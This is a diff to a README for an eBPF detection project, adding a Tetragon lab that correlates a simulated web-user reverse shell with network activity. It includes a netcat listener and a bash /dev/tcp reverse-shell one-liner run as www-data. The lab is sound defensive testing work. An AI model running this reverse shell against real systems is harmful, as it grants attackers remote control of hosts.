@@ -1,6 +1,4 @@
----
-
-## 🛰️ Sentinel Trace v2.0 — Correlation & Context (Work in Progress)
+## 🛰️ Sentinel Trace v2.0 — Correlation & Context: Exploring Reverse Shell (Work in Progress)
 
 **The Goal:** Moving from isolated signals to **behavioral chains**. 
 Instead of just seeing a process, we link it to network activity and MITRE ATT&CK techniques.
@@ -22,3 +20,51 @@ Sentinel Trace v2.0 will detect the following sequence as a single high-priority
 ### 🛠️ Infrastructure Evolution
 - Integration of **Grafana Loki** or **ELK** to centralize and visualize eBPF signals.
 - First automated enforcement rules (**Sigkill** on confirmed C2 connections).
+
+
+# 🧪 Tetragon Standalone — RCE Correlation Lab (Genesis)
+
+## 🛠️ Step-by-Step Lab Setup
+
+---
+
+## 1️⃣ Attacker (Kali) Side 
+![Detection Log](assets/img/v2/v2-network-traffic-detection.png)
+
+Listener receiving incoming connection from the target
+
+```bash
+# Start a Netcat listener on port 4444
+nc -lvnp 4444
+```
+
+---
+
+## 2️⃣ Target (Debian) Side
+![Detection Log](assets/img/v2/v2-tracing-policy-activation.png)
+
+Activation of the correlation policy and launch of real-time monitoring with Identity ("organization","Tetragon","cilium ebpf security tool").
+
+```bash
+# 1. Add the network observability policy
+sudo tetra tracingpolicy add policies/v2-correlation/03-network-observability.yaml
+
+# 2. Start the correlation monitor (Filtering for www-data activity)
+sudo tetra getevents --output json | jq -ce '
+  select(.process_kprobe.process.uid == 33 or .process_exec.process.uid == 33)
+'
+```
+
+---
+
+## 3️⃣ The Attack (Exploit Simulation)
+![Detection Log](assets/img/v2/v2-kali-listener-connection-reverse-shell.png)
+
+Simulation of reverse shell activation as a web user.
+
+```bash
+# Execute the reverse shell payload
+sudo -u www-data bash -c "bash -i >& /dev/tcp/192.168.19.144/4444 0>&1"
+```
+
+---
